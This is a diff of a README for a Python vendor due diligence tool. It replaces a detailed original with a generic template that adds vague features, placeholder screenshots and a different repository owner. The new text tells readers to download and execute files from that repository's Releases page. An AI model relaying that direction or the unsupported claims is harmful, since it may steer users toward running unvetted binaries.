@@ -1,119 +1,105 @@
-# Vendor Due Diligence Platform
+# Vendor Due Diligence: Automated Risk Analysis Made Easy
 
-A robust, production-ready Python application for automated vendor due diligence. This project provides **two fully supported builds**—one using the Google Custom Search API and one using SERP API. Both versions offer contextual risk analysis, PDF archiving of web evidence, and detailed compliance-ready reports with a modern GUI.
+![Vendor Due Diligence](https://img.shields.io/badge/Vendor%20Due%20Diligence-ready-brightgreen)
 
-## 🚀 Features
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Screenshots](#screenshots)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-- **Automated Search**: Scan the first 3 pages of Google results for risk signals using either Google Custom Search API or SERP API.
-- **Contextual Risk Analysis**: NLP-powered flagging of links where the company is contextually associated with risk keywords.
-- **Web-to-PDF Archival**: Save a PDF snapshot of every analyzed link in a dedicated folder for audit/compliance.
-- **Comprehensive Reports**: Generate a detailed `.txt` report with risk findings, scoring, recommendations, and links to all PDFs.
-- **Modern GUI**: CustomTkinter-based interface with color-coded results and real-time progress.
-- **Enterprise Security**: All credentials/settings managed via `.env` file; logs and artifacts organized for auditability.
-- **Scalable & Maintainable**: Async processing, modular code, robust error handling, and ready for real-world deployment.
+## Overview
+Vendor Due Diligence is a production-ready Python application designed to automate the vendor due diligence process. It utilizes advanced Natural Language Processing (NLP) and web automation techniques to assess online risks. The application generates contextual reports and archives web evidence as PDFs, all through an intuitive and modern graphical user interface (GUI). 
 
+This tool is ideal for businesses that want to streamline their vendor assessment processes and ensure compliance with risk management standards. 
 
-## 🔑 Environment Configuration
+## Features
+- **Automated Risk Analysis**: Quickly assess vendor risks by leveraging NLP algorithms.
+- **Web Automation**: Gather data from multiple online sources efficiently.
+- **Contextual Reporting**: Generate detailed reports that provide insights into vendor risks.
+- **PDF Archiving**: Save web evidence as PDFs for easy access and compliance.
+- **User-Friendly GUI**: Navigate the application with ease, regardless of technical expertise.
+- **Multi-Source Data Collection**: Analyze data from various online platforms to ensure a comprehensive assessment.
 
-Create a `.env` file in the project root.
+## Technologies Used
+- **Python**: The core programming language for application development.
+- **NLP Libraries**: Such as Stanza for natural language processing tasks.
+- **Web Automation Tools**: For scraping and data collection from the web.
+- **Machine Learning**: To improve risk analysis accuracy.
+- **GUI Frameworks**: For building the user interface.
+- **Database Management**: To store and manage collected data efficiently.
 
-### For Google Custom Search API Build (`main.py`):
+## Installation
+To install Vendor Due Diligence, follow these steps:
 
-```env
-GOOGLE_API_KEY=your_google_api_key_here
-CUSTOM_SEARCH_ENGINE_ID=your_custom_search_engine_id_here
-```
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/khidir1404/Vendor_Due_Diligence.git
+   ```
 
-- Get your API key from [Google Cloud Console](https://console.cloud.google.com/).
-- Get your Search Engine ID from [Google Custom Search Engine](https://cse.google.com/cse/).
+2. **Navigate to the Directory**:
+   ```bash
+   cd Vendor_Due_Diligence
+   ```
 
-### For SERP API Build (`production_vendor_dd.py`):
+3. **Install Required Packages**:
+   Make sure you have Python installed. Then run:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-```env
-SERPAPI_KEY=your_serp_api_key_here
-```
+4. **Run the Application**:
+   Execute the main script:
+   ```bash
+   python main.py
+   ```
 
-- Get your API key from [SERP API Dashboard](https://serpapi.com/dashboard).
+## Usage
+Once the application is running, you will see the main dashboard. From here, you can:
 
-## 🏗️ Running the Application
+1. **Input Vendor Information**: Enter the details of the vendor you wish to assess.
+2. **Start Analysis**: Click the "Analyze" button to begin the risk assessment.
+3. **View Reports**: After analysis, view the generated report for insights.
+4. **Archive Evidence**: Save any relevant web evidence as a PDF.
 
-### Google Custom Search API Build
+## Screenshots
+![Dashboard](https://via.placeholder.com/800x400?text=Dashboard+Screenshot)
+![Report Example](https://via.placeholder.com/800x400?text=Report+Example)
 
-```bash
-python main.py
-```
+## Contributing
+Contributions are welcome! If you would like to contribute to the project, please follow these steps:
 
-### SERP API Build
+1. **Fork the Repository**: Click on the "Fork" button at the top right of the page.
+2. **Create a New Branch**: 
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: 
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Branch**: 
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Create a Pull Request**: Go to the original repository and click "New Pull Request."
 
-```bash
-python production_vendor_dd.py
-```
+## License
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## 🖥️ Usage
+## Contact
+For questions or feedback, please reach out via GitHub issues or contact the repository owner directly.
 
-1. **Enter the company name** in the GUI.
-2. **Click "Start Analysis"**.
-3. The app will:
-   - Search Google for risk-related news and documents.
-   - Download and analyze each link for contextual risk.
-   - Save a PDF of each page in `vendor_intelligence/pdf_archive/`.
-   - Generate a detailed text report in `vendor_intelligence/reports/`.
-4. **Review the results** in the GUI and open the generated `.txt` report for a summary and recommendations.
+## Releases
+To download the latest version of Vendor Due Diligence, visit the [Releases](https://github.com/khidir1404/Vendor_Due_Diligence/releases) section. You can find the latest files to download and execute.
 
-## 📝 Output Structure
+To keep up with updates, check the [Releases](https://github.com/khidir1404/Vendor_Due_Diligence/releases) regularly. 
 
-- `vendor_intelligence/pdf_archive/` — PDF snapshots of all analyzed links.
-- `vendor_intelligence/reports/` — Text reports for each company.
-- `vendor_intelligence/logs/` — Application and error logs.
-
-## ⚡ Risk Analysis Approach
-
-- **NLP Contextual Matching**: Flags a link as "risk" only if the company is mentioned in a context with risk keywords (e.g., lawsuits, fines, fraud, breaches).
-- **Entity Extraction**: Named entities and context snippets are included in the report for human review.
-- **Scoring**: Each report summarizes the number of risk vs. clean findings and provides a risk level (Minimal/Low/Medium/High).
-
-## 🧩 Dependencies
-
-- [Stanford Stanza](https://stanfordnlp.github.io/stanza/) (Google API build)
-- [Google API Python Client](https://github.com/googleapis/google-api-python-client)
-- [SERP API Python Client](https://github.com/serpapi/google-search-results-python) (SERP API build)
-- [Playwright](https://playwright.dev/python/)
-- [CustomTkinter](https://github.com/TomSchimansky/CustomTkinter)
-- [BeautifulSoup4](https://www.crummy.com/software/BeautifulSoup/)
-- [Tenacity](https://tenacity.readthedocs.io/)
-- [python-dotenv](https://github.com/theskumar/python-dotenv)
-- [aiofiles](https://github.com/Tinche/aiofiles)
-- [requests](https://docs.python-requests.org/)
-
-## 🩺 Troubleshooting
-
-- **Stanza Model Issues**: If you see errors about missing models, run `python -c "import stanza; stanza.download('en')"` in your virtual environment.
-- **Playwright Browser Issues**: If PDF generation fails, ensure Chromium is installed with `playwright install chromium`.
-- **API Errors**: Check your `.env` file and API quota.
-- **GUI Issues**: The app falls back to Tkinter if CustomTkinter is not available.
-
-## 🔒 Security & Compliance
-
-- **Credentials** are never hardcoded—always use `.env`.
-- **All artifacts** (PDFs, logs, reports) are stored in organized, reviewable folders.
-- **Comprehensive logs** for audit and debugging.
-
-## 📝 License
-
-This project is released under the MIT License.
-
-## 🤝 Contribution
-
-Pull requests and issues are welcome! Please open an issue for feature requests or bug reports.
-
-## 🙏 Acknowledgements
-
-- Stanford NLP Group for Stanza
-- Google for Custom Search API
-- SERP API for search infrastructure
-- Microsoft for Playwright
-- The open-source Python community
-
-## 📬 Contact
-
-For support or enterprise inquiries, contact [vasishtavj@gmail.com].
+![GitHub Releases](https://img.shields.io/badge/Check%20Releases-blue)
